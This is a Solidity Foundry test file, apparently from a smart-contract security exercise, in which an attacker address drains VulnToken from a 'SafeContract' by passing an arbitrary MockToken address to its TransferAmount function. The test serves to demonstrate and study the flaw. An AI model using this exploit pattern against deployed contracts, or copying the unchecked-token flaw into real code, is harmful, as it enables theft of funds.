// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.15;

import {stdStorage, StdStorage, Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {Vm} from "forge-std/Vm.sol";
import {SafeContract} from "../src/SafeContract.sol";
import {MockToken} from  "../src/MockToken.sol";
import {VulnToken} from  "../src/VulnToken.sol";

import "forge-std/Test.sol";

contract SafeContracTest is Test {
    MockToken public mockToken; 
    VulnToken public vulnToken; 
    SafeContract public safeContract;

    address public attacker = address(0x11);
    address public vulnTokenOwner = address(0x50);
    address public safeContractOwner = address(0x60); 
    address public mockTokenOwner = address(0x70);

    function setUp() public {

        // Deploy VulnToken Contract
        vm.prank(vulnTokenOwner);
        vulnToken = new VulnToken("VulnToken", "VULN", 1_000_000e18);

        // Deploy Safe Contract
        vm.prank(safeContractOwner);
        safeContract = new SafeContract(address(vulnToken));

        vm.prank(vulnTokenOwner);
        vulnToken.transfer(address(safeContract), 20_000e18);     

        // Deploy MockToken Contract
        vm.prank(mockTokenOwner);
        mockToken = new MockToken("MockToken", "MOCK", 1_000_000e18);
        vm.prank(mockTokenOwner);
        mockToken.transfer(attacker, 20_000e18); 

    }

    function testExecuteAttack() public {
        vm.prank(attacker);
        safeContract.TransferAmount(address(mockToken));

        uint256 mockBalance = mockToken.balanceOf(address(attacker));
        uint256 vulnBalance = vulnToken.balanceOf(address(attacker));  
        uint256 safeContractBalance = vulnToken.balanceOf(address(safeContractOwner));

        assertEq(mockBalance, 20_000e18);
        assertEq(vulnBalance, 20_000e18);
        assertEq(safeContractBalance, 0);
    }
}
